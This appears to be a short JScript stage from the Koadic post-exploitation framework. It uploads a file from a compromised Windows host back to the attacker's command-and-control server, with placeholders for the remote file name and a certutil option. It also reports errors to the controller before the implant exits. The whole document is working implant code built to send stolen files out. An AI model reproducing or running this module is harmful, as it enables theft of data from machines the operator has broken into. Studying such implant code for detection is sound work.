try
{
    Koadic.http.upload("~RFILEF~", "data", ~CERTUTIL~);
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
